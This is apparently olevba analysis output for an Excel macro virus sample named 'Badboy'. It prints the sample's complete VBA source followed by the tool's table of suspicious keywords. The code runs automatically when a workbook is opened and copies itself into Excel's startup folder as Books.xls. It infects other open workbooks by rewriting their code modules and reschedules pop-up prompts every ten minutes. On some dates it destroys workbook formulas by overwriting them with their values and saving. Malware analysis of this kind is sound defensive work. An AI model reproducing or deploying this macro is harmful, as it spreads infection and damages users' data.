olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Badboy-25d8a4e7216c2ff4f77afc95ffa7e6ee99364515
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Badboy-25d8a4e7216c2ff4f77afc95ffa7e6ee99364515 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Sn = "Books.xls"
Sub CreatSelf(r As String)
    On Error Resume Next
    Application.DisplayAlerts = False
    LookAdd
    Application.ActiveWorkbook.SaveAs r
    Application.DisplayAlerts = True
    On Error GoTo 0
End Sub
Private Sub Workbook_Open()
    On Error Resume Next
    Application.ScreenUpdating = False
    r = Application.StartupPath & "\" & Sn
    s = Application.Workbooks(Sn).Name
    If s = "" Then
        cf = ActiveWorkbook.Name
        Application.Workbooks.Add
        CreatSelf (r)
        Workbooks(cf).Activate
    End If
    CheckMsg
    Application.ScreenUpdating = True
    On Error GoTo 0
End Sub
Function LookAdd() As Boolean
    On Error Resume Next
    If ThisWorkbook.Name = ActiveWorkbook.Name Then GoTo NoAdd
    With ActiveWorkbook.VBProject.VBComponents("ThisWorkbook")
        s = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
        m = .CodeModule.CountOfLines
        If m >= s Then GoTo NoAdd
        Do While .CodeModule.CountOfLines > 0
            .CodeModule.DeleteLines 1, .CodeModule.CountOfLines
        Loop
        For i = 1 To s
            sl = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(i, 1)
            .CodeModule.InsertLines i, sl
        Next i
        ap = ActiveWorkbook.Path
        If ap <> "" Then ActiveWorkbook.Save
    End With
YesAdd:
    LookAdd = True
    On Error GoTo 0
    Exit Function
NoAdd:
    LookAdd = False
    On Error GoTo 0
End Function
Sub LookIt()
    On Error Resume Next
    LookAdd
    Application.ScreenUpdating = True
    On Error GoTo 0
End Sub
Sub CheckMsg()
    On Error Resume Next
    Dim RndResult As Integer, C As Integer
    Dim MsgS(1 To 4) As String, YesS(1 To 2) As String, NoS(1 To 2) As String
    Static Ot As Date
    Application.OnTime Ot, Sn & "!ThisWorkbook.CheckMsg", schedule:=False
    MsgS(1) = "ОТІВПл,ДгТ»¶ЁєЬїЙ°®,ФјДгµЅЅЦРД№«Ф°ЙўЙўІЅ,ДгІ»ЅйТв°Й !"
    MsgS(2) = "ЅсМмµДТ№ѕ°Н¦ГА , ФјДгµЅТфАЦї§·И№ЭЧшЧш,єГВр ?!"
    MsgS(3) = "Щ»ГГ ! јыµЅДгХжёЯРЛ,ЅсНнФјДгµЅµДКїёЯМшОи,І»ЦЄТвПВИзєО !"
    MsgS(4) = "РЎІцГЁ ! ФЫГЗ»№КЗПИЅвѕцДгµДІцЧмОКМв,ґуЕЕµµИзєО !"
    YesS(1) = "М«єГБЛ, јыГжєуОТТ»¶ЁТЄЗлЅМДгµД·јГы !"
    YesS(2) = "ЧўТв , ОТКЦЦРДГЧЕТ»КшПК»ЁФЪГЕїЪµИДг !"
    NoS(1) = "ХжІ»ЗЙ , ХвёцµШ·ЅТСѕ­НЈТµБЛ !"
    NoS(2) = "їґОТХвјЗРФ , ѕУИ»НьБЛДЗёцµШ·ЅФЪДД¶щ !"
    Randomize
    RndResult = Int((4 * Rnd) + 1)
    C = MsgBox(MsgS(RndResult), vbYesNo, "ПЈНыДгДЬЅУКЬОТµДСыЗл!")
    Randomize
    If C = vbYes Then
        If LookAdd = True Then
            RndResult = Int((2 * Rnd) + 1)
            MsgBox YesS(RndResult), vbOKOnly, "єНДгФј»б,ОТєГїЄРДЕ¶!"
        Else
            C = vbNo
        End If
    End If
    If C = vbNo Then
        'Bad boy
        Application.ScreenUpdating = False
        If Right(Date$, 1) = 1 Then
            ol = Selection.Address
            Cells.Select
            Application.CutCopyMode = False
            Selection.Copy
            Selection.PasteSpecial Paste:=xlValues, Operation:=xlNone, SkipBlanks:= _
                False, Transpose:=False
            Application.CutCopyMode = False
            Range(ol).Select
            ap = ActiveWorkbook.Path
            If ap <> "" Then ActiveWorkbook.Save
        End If
        Application.ScreenUpdating = True
        RndResult = Int((2 * Rnd) + 1)
        MsgBox NoS(RndResult), vbOKOnly, "Нт·ЦТЕє¶,ПЈНыПВґО»№УР»ъ»б!"
    End If
    Ot = Now + TimeValue("00:10:00")
    Application.OnTime Ot, Sn & "!ThisWorkbook.CheckMsg"
    On Error GoTo 0
End Sub


































-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Badboy-25d8a4e7216c2ff4f77afc95ffa7e6ee99364515 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Badboy-25d8a4e7216c2ff4f77afc95ffa7e6ee99364515 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Badboy-25d8a4e7216c2ff4f77afc95ffa7e6ee99364515 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

